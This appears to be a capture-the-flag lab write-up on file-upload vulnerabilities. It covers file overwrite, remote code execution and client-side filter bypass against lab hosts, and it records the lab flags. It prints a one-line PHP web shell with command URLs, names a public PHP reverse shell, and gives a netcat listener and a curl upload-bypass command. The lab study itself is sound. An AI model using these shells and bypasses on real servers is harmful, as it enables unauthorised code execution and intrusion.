    Pickle Rick
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../sqlinjection/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SQL Injection
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../sqlinjectionlab/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SQL Injection Lab
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ssrf/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SSRF
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../steelmountain/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Steel Mountain
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../subdomainenumeration/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Subdomain Enumeration
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../traverse/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Traverse
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  <span class="md-ellipsis">
    Upload Vulnerabilities
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  <span class="md-ellipsis">
    Upload Vulnerabilities
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#introduction" class="md-nav__link">
    <span class="md-ellipsis">
      Introduction
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-2-introduction" class="md-nav__link">
    <span class="md-ellipsis">
      Task 2 - Introduction
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-3-general-methodology" class="md-nav__link">
    <span class="md-ellipsis">
      Task 3 - General Methodology
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-4-overwriting-existing-files" class="md-nav__link">
    <span class="md-ellipsis">
      Task 4 - Overwriting Existing Files
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-5-remote-code-execution" class="md-nav__link">
    <span class="md-ellipsis">
      Task 5 - Remote Code Execution
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-6-filtering" class="md-nav__link">
    <span class="md-ellipsis">
      Task 6 - Filtering
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Task 6 - Filtering">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#extension-validation" class="md-nav__link">
    <span class="md-ellipsis">
      Extension Validation
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#file-type-filtering" class="md-nav__link">
    <span class="md-ellipsis">
      File Type Filtering
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#file-length-filtering" class="md-nav__link">
    <span class="md-ellipsis">
      File Length Filtering
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#file-name-filtering" class="md-nav__link">
    <span class="md-ellipsis">
      File Name Filtering
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#file-content-filtering" class="md-nav__link">
    <span class="md-ellipsis">
      File Content Filtering
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-7-bypassing-client-side-filtering" class="md-nav__link">
    <span class="md-ellipsis">
      Task 7 - Bypassing Client-Side Filtering
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Task 7 - Bypassing Client-Side Filtering">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#practical-example" class="md-nav__link">
    <span class="md-ellipsis">
      Practical Example
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-8-bypassing-server-side-filtering-file-extensions" class="md-nav__link">
    <span class="md-ellipsis">
      Task 8 - Bypassing Server-Side Filtering: File Extensions
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Task 8 - Bypassing Server-Side Filtering: File Extensions">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#practical-example_1" class="md-nav__link">
    <span class="md-ellipsis">
      Practical Example
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-9-bypassing-server-side-filtering-magic-numbers" class="md-nav__link">
    <span class="md-ellipsis">
      Task 9 - Bypassing Server-Side Filtering: Magic Numbers
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-10-example-methodology" class="md-nav__link">
    <span class="md-ellipsis">
      Task 10 - Example Methodology
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-11-challenge" class="md-nav__link">
    <span class="md-ellipsis">
      Task 11 - Challenge
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../vulnversity/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Vulnversity
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../whattheshell/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    What the Shell?
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#introduction" class="md-nav__link">
    <span class="md-ellipsis">
      Introduction
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-2-introduction" class="md-nav__link">
    <span class="md-ellipsis">
      Task 2 - Introduction
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-3-general-methodology" class="md-nav__link">
    <span class="md-ellipsis">
      Task 3 - General Methodology
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-4-overwriting-existing-files" class="md-nav__link">
    <span class="md-ellipsis">
      Task 4 - Overwriting Existing Files
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-5-remote-code-execution" class="md-nav__link">
    <span class="md-ellipsis">
      Task 5 - Remote Code Execution
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-6-filtering" class="md-nav__link">
    <span class="md-ellipsis">
      Task 6 - Filtering
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Task 6 - Filtering">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#extension-validation" class="md-nav__link">
    <span class="md-ellipsis">
      Extension Validation
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#file-type-filtering" class="md-nav__link">
    <span class="md-ellipsis">
      File Type Filtering
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#file-length-filtering" class="md-nav__link">
    <span class="md-ellipsis">
      File Length Filtering
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#file-name-filtering" class="md-nav__link">
    <span class="md-ellipsis">
      File Name Filtering
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#file-content-filtering" class="md-nav__link">
    <span class="md-ellipsis">
      File Content Filtering
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-7-bypassing-client-side-filtering" class="md-nav__link">
    <span class="md-ellipsis">
      Task 7 - Bypassing Client-Side Filtering
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Task 7 - Bypassing Client-Side Filtering">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#practical-example" class="md-nav__link">
    <span class="md-ellipsis">
      Practical Example
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-8-bypassing-server-side-filtering-file-extensions" class="md-nav__link">
    <span class="md-ellipsis">
      Task 8 - Bypassing Server-Side Filtering: File Extensions
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Task 8 - Bypassing Server-Side Filtering: File Extensions">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#practical-example_1" class="md-nav__link">
    <span class="md-ellipsis">
      Practical Example
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-9-bypassing-server-side-filtering-magic-numbers" class="md-nav__link">
    <span class="md-ellipsis">
      Task 9 - Bypassing Server-Side Filtering: Magic Numbers
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-10-example-methodology" class="md-nav__link">
    <span class="md-ellipsis">
      Task 10 - Example Methodology
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#task-11-challenge" class="md-nav__link">
    <span class="md-ellipsis">
      Task 11 - Challenge
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  


  <h1>Upload Vulnerabilities</h1>

<h2 id="introduction">Introduction<a class="headerlink" href="#introduction" title="Permanent link">&para;</a></h2>
<p>In this room, we will be exploring basic file-upload vulnerabilities in web applications. Before we begin, we need to modify our <code>/etc/hosts</code> file to include the following:</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>10.10.68.175    overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic.uploadvulns.thm jewel.uploadvulns.thm demo.uploadvulns.thm
</code></pre></div>
Note: Remove these lines when terminating the box.</p>
<p>The server can be accessed with one of the following virtual hosts:</p>
<ul>
<li>overwrite.uploadvulns.thm</li>
<li>shell.uploadvulns.thm</li>
<li>java.uploadvulns.thm</li>
<li>annex.uploadvulns.thm</li>
<li>magic.uploadvulns.thm</li>
<li>jewel.uploadvulns.thm</li>
</ul>
<h2 id="task-2-introduction">Task 2 - Introduction<a class="headerlink" href="#task-2-introduction" title="Permanent link">&para;</a></h2>
<p>The ability to upload files to a server has become an integral part of how users interact with web applications. When handled poorly, file uploads can open up severe vulnerabilities in the server leading to anything from a minor nuisance to full Remote Code Execution (RCE) if an attacker manages to upload and execute a shell.</p>
<p>The purpose of this room is to explore some of the vulnerabilities resulting from improper handling of file uploads. More specifically, the room will look at:</p>
<ul>
<li>Overwriting existing files on a server</li>
<li>Uploading and Executing Shells on a server</li>
<li>Bypassing Client-Side filtering</li>
<li>Bypassing various kinds of Server-Side filtering</li>
<li>Fooling content type validation checks</li>
</ul>
<h2 id="task-3-general-methodology">Task 3 - General Methodology<a class="headerlink" href="#task-3-general-methodology" title="Permanent link">&para;</a></h2>
<p>First step to finding file upload vulnerabilities is to find the point of file upload. Enumeration and Recon are key here.</p>
<blockquote>
<p>With a basic understanding of how the website might be handling our input, we can then try to poke around and see what we can and can't upload. If the website is employing client-side filtering then we can easily look at the code for the filter and look to bypass it (more on this later!). If the website has server-side filtering in place then we may need to take a guess at what the filter is looking for, upload a file, then try something slightly different based on the error message if the upload fails. Uploading files designed to provoke errors can help with this. Tools like Burpsuite or OWASP Zap can be very helpful at this stage.</p>
</blockquote>
<h2 id="task-4-overwriting-existing-files">Task 4 - Overwriting Existing Files<a class="headerlink" href="#task-4-overwriting-existing-files" title="Permanent link">&para;</a></h2>
<p>When a file is uploaded to the server, a range of checks should be carried out to ensure that the file will not overwrite an existing file on the server. A common practice is to assign the uploaded file a new name on the server-side. Alternatively, the server may perform a check to see if the file name already exist and return an error in the event the checks are true. File permissions can also assist in preventing files from being overwritten.</p>
<p>To solve this challenge, navigate to <code>http://overwrite.uploadvulns.thm</code> and look at the source page. Our aim find a target image we can overwrite.</p>
<p><img alt="File Overwrite Target" src="../../../assets/images/thm/uploadvulnerabilities/01%20-%20File%20Overwrite%20Target.png" /></p>
<p>Let's download an image from the internet and rename it to <code>mountains.jpg</code>. Upload the downloaded file to overwrite the existing file.</p>
<p><img alt="File Overwrite Flag" src="../../../assets/images/thm/uploadvulnerabilities/02%20-%20File%20Overwrite%20Flag.png" /></p>
<p>Retrieved Flag: <code>THM{OTBiODQ3YmNjYWZhM2UyMmYzZDNiZjI5}</code></p>
<h2 id="task-5-remote-code-execution">Task 5 - Remote Code Execution<a class="headerlink" href="#task-5-remote-code-execution" title="Permanent link">&para;</a></h2>
<p>In this challenge, we will looking at uploading a file to enable RCE on the server. RCE allows and attacker to execute arbitrary code on the web server. Generally this RCE happens as a low-privileged user (such as <code>www-data</code> on Linux servers) but it is a serious vulnerability none-the-less.</p>
<p>Remote code execution via a file upload vulnerability in a web application tend to be exploited by uploading a program written in the same language as the back-end of the website (or another language which the server understands and will execute).</p>
<p>It is worth nothing that in a <em>routed</em> application (an application where the routes are defined programmatically rather than being mapped to the file-system), this method of attack becomes a lot more complicated and a lot less likely to occur. Most modern web frameworks are routed programmatically.</p>
<p>There are two basic ways to achieve RCE on a web server when exploiting a file upload vulnerability: webshells and reverse/bind shells. A full featured reverse/bind shell is the ideal goal for an attacker; however a webshell may be the only option available (for example, if a file length limit has been imposed on uploads or if firewall rules prevent any network-based shells).</p>
<p>As a general methodology, we would be looking to upload a shell, then activate it either by navigating directly to the file if the server allows it (non-routed applications with inadequate permissions) or by otherwise forcing the webapp to run the script for us (necessary in routed applications).</p>
<p>For this challenge, our target will be: <code>http://shell.uploadvulns.thm</code></p>
<p>Before we can proceed, we need to enumerate the host to find our upload point on the web application. We can use several tools but in our case we will be using Feroxbuster.</p>
<p><img alt="RCE Ferox Output" src="../../../assets/images/thm/uploadvulnerabilities/03%20-%20RCE%20Shell%20Ferox.png" /></p>
<p>We have two possible directories which could be used for uploads. The directory called <code>/resources</code> seems the most promising. Let's upload a dummy file to see if our assumption is correct.</p>
<p><img alt="RCE File Upload Verification" src="../../../assets/images/thm/uploadvulnerabilities/04%20-%20RCE%20File%20Upload%20Verification.png" /></p>
<p>Looks like our assumption was correct. Let's go ahead and craft a simple web shell to test with first. A simple web shell in PHP can be coded as follows:</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="cp">&lt;?php</span>
<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>    <span class="k">echo</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;cmd&quot;</span><span class="p">]);</span>
<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="cp">?&gt;</span>
</code></pre></div>
Upload the PHP web shell to the the web application and activate it from the <code>/resources</code> directly.</p>
<p><img alt="RCE Shell Upload" src="../../../assets/images/thm/uploadvulnerabilities/05%20-%20RCE%20Shell%20Upload.png" /></p>
<p>Since our PHP shell retrieves a command to execute using a GET request, we can execute our shell by inputting the desired commands in the URL as follows:</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>http://http://shell.uploadvulns.thm/resources/shell.php?cmd=whoami;ls;id
</code></pre></div>
<img alt="RCE Web Shell Execute" src="../../../assets/images/thm/uploadvulnerabilities/06%20-%20RCE%20Web%20Shell%20Execute.png" /></p>
<p>Note that it is sometimes better to view the page source code as the formatting of the returned results may be better.</p>
<p><img alt="RCE Web Shell Execute View Source" src="../../../assets/images/thm/uploadvulnerabilities/07%20-%20RCE%20Web%20Shell%20Execute%20Source.png" /></p>
<p>Using this method, we can extract the flag located in <code>/var/www/</code> directory by systematically finding the name of the flag file and then using cat to output the flag.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>http://shell.uploadvulns.thm/resources/shell.php?cmd=ls%20/var/www/
<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>http://shell.uploadvulns.thm/resources/shell.php?cmd=cat%20/var/www/flag.txt
</code></pre></div>
<p><img alt="RCE Web Shell Flag" src="../../../assets/images/thm/uploadvulnerabilities/08%20-%20RCE%20Web%20Shell%20Flag.png" /></p>
<p>Let's try to retrieve this flag using a reverse shell. We can use the PHP reverse shell from: <code>https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</code></p>
<p>Configure the reverse shell with our <code>tun 0</code> IP address, save and upload this to the web application.</p>
<p><img alt="RCE Rev Shell Config" src="../../../assets/images/thm/uploadvulnerabilities/09%20-%20RCE%20Rev%20Shell%20Config.png" /></p>
<p>Start a Netcat listner on port <code>1234</code> and execute the shell by navigating to the file and clicking on it:</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="gp">$ </span>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">1234</span>
</code></pre></div>
We have a reverse shell!</p>
<p><img alt="RCE Rev Shell" src="../../../assets/images/thm/uploadvulnerabilities/10%20-%20RCE%20Rev%20Shell.png" /></p>
<p>Let's retrieve the flag.</p>
<p><img alt="RCE Rev Shell Flag" src="../../../assets/images/thm/uploadvulnerabilities/11%20-%20RCE%20Rev%20Shell%20Flag.png" /></p>
<p>Retrieved Flag: <code>THM{YWFhY2U3ZGI4N2QxNmQzZjk0YjgzZDZk}</code></p>
<h2 id="task-6-filtering">Task 6 - Filtering<a class="headerlink" href="#task-6-filtering" title="Permanent link">&para;</a></h2>
<p>Input filtering is a common defence technique employed by web developers against file upload vulnerabilities. See [[platform.thm.adventofcyber2022.day15]] for more information regarding unrestricted file uploads and strategies to defend against file upload vulnerabilities.</p>
<p>I this challenge, we will be looking at some of the defence mechanisms used by web developers to prevent malicious file uploads and how to circumvent them.</p>
<p>Before we begin, let's discuss the difference between client-side and server-side filtering.
  - <strong>Client-Side</strong>: Client-side in context of web applications means that it is running in the user's browser as opposed to on the web server itself. JavaScript is very common as the client-side language. A client-side script will run in a user's we browser. Client-side filtering is trivial to bypass and as such client-side filtering by itself is a highly insecure method of verifying that na uploaded file is not malicious.
  - <strong>Server-Side</strong>: Server-side scripts run on the server. PHP is predominantly used as a server-side language (with Microsoft's ASP for IIS coming in a close second). Server-side filtering tends to be more difficult to bypass. As the code is executed on the server, it would be impossible to bypass the filter completely; instead the attacker would need to form a payload which conforms to the filters in place while still allowing the attacker to execute the payload.</p>
<p>With the above in mind, let's look at different kind of filtering.</p>
<h4 id="extension-validation">Extension Validation<a class="headerlink" href="#extension-validation" title="Permanent link">&para;</a></h4>
<p>File extensions can be used to identify the contents of a file. In practice they are very easy to change. Note that Microsoft Windows still uses file extensions to identify file types while UNIX based systems tend to rely on other methods (discussed further below).</p>
<p>Filters that check for file extensions work in one of two ways:
 - Blacklist extensions - have a list of extensions which are not allowed.
 - Whitelist extensions - have a list of extensions which are allowed while rejecting everything else.</p>
<h4 id="file-type-filtering">File Type Filtering<a class="headerlink" href="#file-type-filtering" title="Permanent link">&para;</a></h4>
<p>File type filtering is similar to file extension validation but instead looks at HTTP request headers to verify that the contents of a file are acceptable to upload.
  - <strong>MIME Validation</strong>: MIME (or Multipurpose Internet Mail Extension) types are used as an identifier for files. The MIME type for a file upload is attached in the HTTP request header.</p>
<p><img alt="MIME Validation" src="../../../assets/images/thm/uploadvulnerabilities/12%20-%20MIME.png" />
  <br>
  MIME types (Content-Type) follow the format <code>/</code>. I the HTTP request above, an image <code>spaniel.jpg</code> with a MIME type (or Content-Type) of <code>image/jpeg</code> was uploaded.</p>
<p>The MIME type for a file can be checked client-side and/or server-side. Since MIME type is based on the extension of the file, it is extremely easy to bypass.
  - <strong>Magic Number Validation</strong>: Magic numbers are the more accurate way of determining the content of a file. The <em>magic number</em> of a file is a string of bytes at the very beginning of a the file content which identify the content (<a href="https://en.wikipedia.org/wiki/List_of_file_signatures">List of file signatures - Wikipedia</a>). Unlike Windows, Unix systems use magic numbers for identifying files. This is not a guaranteed solution but it is more effective than checking the extension of the file alone.</p>
<h4 id="file-length-filtering">File Length Filtering<a class="headerlink" href="#file-length-filtering" title="Permanent link">&para;</a></h4>
<p>File length filters are used to prevent huge files from being uploaded to the server via an upload form. This technique is most often used to prevent attacks which can potentially starve the server of resources thus preventing (or denying) other users the ability to upload files. These types of attacks are commonly referred to as <em>denial of service</em> attacks.</p>
<h4 id="file-name-filtering">File Name Filtering<a class="headerlink" href="#file-name-filtering" title="Permanent link">&para;</a></h4>
<p>Typically, files uploaded to a server should be unique. Usually this means adding a random aspect to the file name. Alternatively, developers can check if a file with the same name already exists on the server and provide an error to the user if such is the case. Additionally, file names should be sanitized on upload to ensure that they don't contain any <em>bad characters</em> which could potentially cause problems on the file system when uploaded (ie. null bytes or forward slashes or control characters such as <code>;</code> and potential unicode characters).</p>
<p>This means that on well administered servers, our uploaded files are unlikely to have the same name we ave them before uploading.</p>
<h4 id="file-content-filtering">File Content Filtering<a class="headerlink" href="#file-content-filtering" title="Permanent link">&para;</a></h4>
<p>File content filtering is more complicated as it requires a scan of the full contents of an uploaded file to ensure that it's not spoofing its extension, MIME and magic number. This is a significantly more complex process that majority of the basic filtration systems employed.</p>
<h2 id="task-7-bypassing-client-side-filtering">Task 7 - Bypassing Client-Side Filtering<a class="headerlink" href="#task-7-bypassing-client-side-filtering" title="Permanent link">&para;</a></h2>
<p>In this task we will be looking at bypassing client-side filtering. As mentioned in the previous section, client-side filtering tends to extremely easy to bypass as it occurs entirely on the machine controlled by the attacker.</p>
<p>There are for easy ways to bypass client-side file upload filters:
  - <em>Turn off Javascript in your browser</em> - this will work provided the site doesn't require Javascript in order to provide basic functionality.
  - <em>Intercept and modify the incoming web request</em> - using tools like Burp Suite, we can intercept the incoming web request and strip out the Javascript filter before it has a chance to run. More on this below.
  - <em>Intercept and modify the file upload</em> - where the methods work before the webpage is loaded, this method allows the web page to load as normal but intercepts the file upload after it's already passed (and been accepted by the filter). More on this below.
  - <em>Send the file directly to the upload point</em> - Why use the webpage with the filter when the file can be sent directly using a tool like <code>curl</code>? Posting the data directly to the page which contains the code for handling the file upload is another effective method for completely bypassing a client side filter. To use this method, you would first need to intercept a successful upload (using Burp Suite) to see the parameters being used in the upload which can then be slotted into the following command: <code>curl -X POST -F "submit:&lt;value&gt;" -F "&lt;file-parameter&gt;:@&lt;path-to-file&gt;" &lt;site&gt;</code></p>
<h4 id="practical-example">Practical Example<a class="headerlink" href="#practical-example" title="Permanent link">&para;</a></h4>
<p>Let's look at a practical example below. Before we can begin, we need to to enumerate the website to find possible location for our uploaded files. Let's upload a test file and then run a tool like <code>feroxbuster</code> to enumerate the host.</p>
<p>Looking at the source-page, we find that a client-side filter is being employed with a white-list for file extension <code>png</code>.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="nb">window</span><span class="p">.</span><span class="nx">onload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(){</span>
<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">upload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&quot;fileSelect&quot;</span><span class="p">);</span>
<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">responseMsg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByClassName</span><span class="p">(</span><span class="s2">&quot;responseMsg&quot;</span><span class="p">)[</span><span class="mf">0</span><span class="p">];</span>
<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">errorMsg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&quot;errorMsg&quot;</span><span class="p">);</span>
<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">uploadMsg</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&quot;uploadtext&quot;</span><span class="p">);</span>
<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="w">    </span><span class="nx">upload</span><span class="p">.</span><span class="nx">value</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">;</span>
<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="w">    </span><span class="nx">upload</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s2">&quot;change&quot;</span><span class="p">,</span><span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">){</span>
<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a><span class="w">        </span><span class="kd">var</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">files</span><span class="p">[</span><span class="mf">0</span><span class="p">];</span>
<a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a><span class="w">        </span><span class="nx">responseMsg</span><span class="p">.</span><span class="nx">style</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;display:none;&quot;</span><span class="p">;</span>
<a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">file</span><span class="p">.</span><span class="nx">type</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="s2">&quot;image/png&quot;</span><span class="p">){</span>
<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a><span class="w">            </span><span class="nx">upload</span><span class="p">.</span><span class="nx">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">;</span>
<a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a><span class="w">            </span><span class="nx">uploadMsg</span><span class="p">.</span><span class="nx">style</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;display:none;&quot;</span><span class="p">;</span>
<a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a><span class="w">            </span><span class="nx">error</span><span class="p">();</span>
<a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="p">{</span>
<a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a><span class="w">            </span><span class="nx">uploadMsg</span><span class="p">.</span><span class="nx">innerHTML</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;Chosen File: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">upload</span><span class="p">.</span><span class="nx">value</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="sr">/(\\|\/)/g</span><span class="p">).</span><span class="nx">pop</span><span class="p">();</span>
<a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a><span class="w">            </span><span class="nx">responseMsg</span><span class="p">.</span><span class="nx">style</span><span class="o">=</span><span class="s2">&quot;display:none;&quot;</span><span class="p">;</span>
<a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a><span class="w">            </span><span class="nx">errorMsg</span><span class="p">.</span><span class="nx">style</span><span class="o">=</span><span class="s2">&quot;display:none;&quot;</span><span class="p">;</span>
<a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a><span class="w">            </span><span class="nx">success</span><span class="p">();</span>
<a id="__codelineno-5-19" name="__codelineno-5-19" href="#__codelineno-5-19"></a><span class="w">        </span><span class="p">}</span>
<a id="__codelineno-5-20" name="__codelineno-5-20" href="#__codelineno-5-20"></a><span class="w">    </span><span class="p">});</span>
<a id="__codelineno-5-21" name="__codelineno-5-21" href="#__codelineno-5-21"></a><span class="p">};</span>
</code></pre></div>
Let's upload a test image and begin our enumeration.</p>
<p><img alt="Client-Side Filter Bypass" src="../../../assets/images/thm/uploadvulnerabilities/13%20-%20Client%20Side%20Bypass.png" /></p>
<p><img alt="Client-Side Directory Enumeration" src="../../../assets/images/thm/uploadvulnerabilities/14%20-%20Client%20Side%20Bypass%20Ferox.png" /></p>
